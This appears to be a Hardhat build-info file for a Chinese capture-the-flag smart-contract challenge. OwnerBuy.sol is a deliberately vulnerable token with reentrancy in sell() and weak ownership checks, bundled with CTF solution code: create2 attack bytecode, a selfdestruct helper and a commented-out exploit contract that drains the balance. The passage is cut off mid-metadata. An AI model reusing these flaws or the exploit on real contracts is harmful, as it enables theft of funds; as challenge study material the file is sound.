{
	"id": "78d0cc433782cf44f33c0dbb6fbd9106",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.5.17",
	"solcLongVersion": "0.5.17+commit.d19bba13",
	"input": {
		"language": "Solidity",
		"sources": {
			"赛题-预赛/第四题/OwnerBuy.sol": {
				"content": "// 0.5.1-c8a2\r\n// Enable optimization\r\npragma solidity ^0.5.0;\r\nimport \"./contracts/ERC20.sol\";\r\nimport \"./contracts/IERC20.sol\";\r\nimport \"./contracts/ERC20Detailed.sol\";\r\n\r\n\r\ninterface Changing {\r\n    function isOwner(address) external returns (bool);\r\n}\r\n\r\ncontract Ownable {\r\n    address public _owner;\r\n    address public _previousOwner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() internal {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    //Locks the contract for owner for the amount of time provided\r\n    function lock() public onlyOwner {\r\n        _previousOwner = _owner;\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n\r\n    //Unlocks the contract for owner when _lockTime is exceeds\r\n    function unlock() external payable {\r\n        require(msg.value >= 1 ether);\r\n        emit OwnershipTransferred(_owner, _previousOwner);\r\n        _owner = _previousOwner;\r\n    }\r\n}\r\n\r\ncontract OwnerBuy is Ownable, ERC20, ERC20Detailed {\r\n    mapping(address => bool) public status;\r\n    mapping(address => uint256) public Times;\r\n    mapping(address => bool) internal whiteList;\r\n    uint256 MAXHOLD = 100;\r\n    event finished(bool);\r\n\r\n    constructor() public ERC20Detailed(\"DEMO\", \"DEMO\", 18) {}\r\n\r\n    function isWhite(address addr) public view returns (bool) {\r\n        return whiteList[addr];\r\n    }\r\n\r\n    function setWhite(address addr) external onlyOwner returns (bool) {\r\n        whiteList[addr] = true;\r\n        return true;\r\n    }\r\n\r\n    function unsetWhite(address addr) external onlyOwner returns (bool) {\r\n        whiteList[addr] = false;\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal {\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        if (!isWhite(recipient)) {\r\n            require(_balances[recipient] <= MAXHOLD, \"hold overflow\");\r\n        }\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function changestatus(address _owner) public {\r\n        Changing tmp = Changing(msg.sender);\r\n        if (!tmp.isOwner(_owner)) {\r\n            status[msg.sender] = tmp.isOwner(_owner);\r\n        }\r\n    }\r\n\r\n    function changeOwner() public {\r\n        require(tx.origin != msg.sender);\r\n        require(uint(msg.sender) & 0xffff == 0xffff);\r\n        if (status[msg.sender] == true) {\r\n            status[msg.sender] = false;\r\n            _owner = msg.sender;\r\n        }\r\n    }\r\n\r\n    function buy() public payable returns (bool success) {\r\n        require(_owner == 0x220866B1A2219f40e72f5c628B65D54268cA3A9D);\r\n        require(tx.origin != msg.sender);\r\n        require(Times[msg.sender] == 0);\r\n        require(_balances[msg.sender] == 0);\r\n        require(msg.value == 1 wei);\r\n        _balances[msg.sender] = 100;\r\n        Times[msg.sender] = 1;\r\n        return true;\r\n    }\r\n\r\n    function sell(uint256 _amount) public returns (bool success) {\r\n        require(_amount >= 200);\r\n        require(uint(msg.sender) & 0xffff == 0xffff);\r\n        require(Times[msg.sender] > 0);\r\n        require(_balances[msg.sender] >= _amount);\r\n        require(address(this).balance >= _amount);\r\n        msg.sender.call.gas(1000000)(\"\");\r\n        _transfer(msg.sender, address(this), _amount);\r\n        Times[msg.sender] -= 1;\r\n        return true;\r\n    }\r\n\r\n    function finish() public onlyOwner returns (bool) {\r\n        require(Times[msg.sender] >= 100);\r\n        Times[msg.sender] = 0;\r\n        msg.sender.transfer(address(this).balance);\r\n        emit finished(true);\r\n        return true;\r\n    }\r\n}\r\ncontract deployed{\r\n   \r\n    bytes contractBytecode = hex\"60806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032\";\r\n    function deploy(bytes32 salt) public returns(address) {\r\n    bytes memory bytecode = contractBytecode;\r\n    address addr;\r\n      \r\n    assembly {\r\n      addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\r\n    }\r\n    return addr;\r\n}\r\n    function getHash()public view returns(bytes32){\r\n        return keccak256(contractBytecode);\r\n        }\r\n}\r\ncontract self{\r\n    function selfd(address payable _addr)public payable{\r\n        selfdestruct(_addr);\r\n    }\r\n}\r\n\r\n// contract ownerBuyAttack{\r\n//     OwnerBuy ownerbuy;\r\n//     bool public count;\r\n//     constructor(address _addr)public payable{\r\n//         ownerbuy = OwnerBuy(_addr);\r\n//     }\r\n//     function becomeOwner()public{\r\n//         ownerbuy.changeOwner();\r\n//     }\r\n//     function setWhite()public{\r\n//         ownerbuy.setWhite(address(this));\r\n//         ownerbuy.setWhite(address(ownerbuy));\r\n//     }\r\n//     function transferOwner()public{\r\n//         ownerbuy.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);\r\n//     }\r\n//     function buy()public{\r\n//         ownerbuy.buy.value(1)();\r\n//     }\r\n//     function sell()public{\r\n//         ownerbuy.sell(200);\r\n//     }\r\n//     function finish()public{\r\n//         ownerbuy.finish();\r\n//     }\r\n//     function()external payable{\r\n//         if(!count){\r\n//             count=true;\r\n//             ownerbuy.sell(200);\r\n//         }\r\n//     }\r\n// }\r\n"
			},
			"赛题-预赛/第四题/contracts/ERC20Detailed.sol": {
				"content": "pragma solidity ^0.5.0;\r\n\r\nimport \"./IERC20.sol\";\r\n\r\n/**\r\n * @dev Optional functions from the ERC20 standard.\r\n */\r\ncontract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    /**\r\n     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of\r\n     * these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\n"
			},
			"赛题-预赛/第四题/contracts/IERC20.sol": {
				"content": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\r\n * the optional functions; to access them see {ERC20Detailed}.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n"
			},
			"赛题-预赛/第四题/contracts/ERC20.sol": {
				"content": "pragma solidity ^0.5.0;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./SafeMath.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20Mintable}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of ERC20 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract ERC20 is IERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    mapping (address => uint256) internal _balances;\r\n\r\n    mapping (address => mapping (address => uint256)) internal _allowances;\r\n\r\n    uint256 internal _totalSupply;\r\n    \r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20};\r\n     *\r\n     * Requirements:\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `value`.\r\n     * - the caller must have allowance for `sender`'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n     /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 value) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _totalSupply = _totalSupply.sub(value);\r\n        _balances[account] = _balances[account].sub(value);\r\n        emit Transfer(account, address(0), value);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\r\n     *\r\n     * This is internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 value) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n\r\n    /**\r\n     * @dev Destoys `amount` tokens from `account`.`amount` is then deducted\r\n     * from the caller's allowance.\r\n     *\r\n     * See {_burn} and {_approve}.\r\n     */\r\n    function _burnFrom(address account, uint256 amount) internal {\r\n        _burn(account, amount);\r\n        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));\r\n    }\r\n    \r\n}"
			},
			"赛题-预赛/第四题/contracts/SafeMath.sol": {
				"content": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it's recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        return a % b;\r\n    }\r\n}\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"赛题-预赛/第四题/OwnerBuy.sol": {
				"Changing": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "isOwner",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"isOwner(address)": "2f54bf6e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":\"Changing\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":{\"keccak256\":\"0x6c5b72099bc5f9740cbeb28650f50b1291a1eca5fbdbf6611673c9c8bcf2ba41\",\"urls\":[\"bzz-raw://f123693ee63491f5f4e4f8a62829af806c8814e5bdaaf6ce34ce08dbf396c33d\",\"dweb:/ipfs/QmPoszddSPRrmMRMFwfT9cXvCZmLbSEobQwqV2p1qEvd99\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20.sol\":{\"keccak256\":\"0x91a3b598fc86ea761b5a8296e26690e460e78d1606eb518994e5c2ba15fa194f\",\"urls\":[\"bzz-raw://f2e312a214c618db25822c5af3c0ea4811c7f42422b0d1051d468adbfbb53774\",\"dweb:/ipfs/QmdG5we7FRV1TFopjEvhSb63e5K2HUE3Y5fcdcR3CcuDe4\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20Detailed.sol\":{\"keccak256\":\"0xe20fce8726ac6988a627b4abae707647c8c46d9b5be24e0e085c718e854d9e34\",\"urls\":[\"bzz-raw://99a90f29bbd180bc88edf71c0583ec07d109bcfae5530aaffee434d0188c33e8\",\"dweb:/ipfs/Qmb2AKkdtcH2eWtXtaaSqABrLtBgcc9ppkn4iJPP89NNKp\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u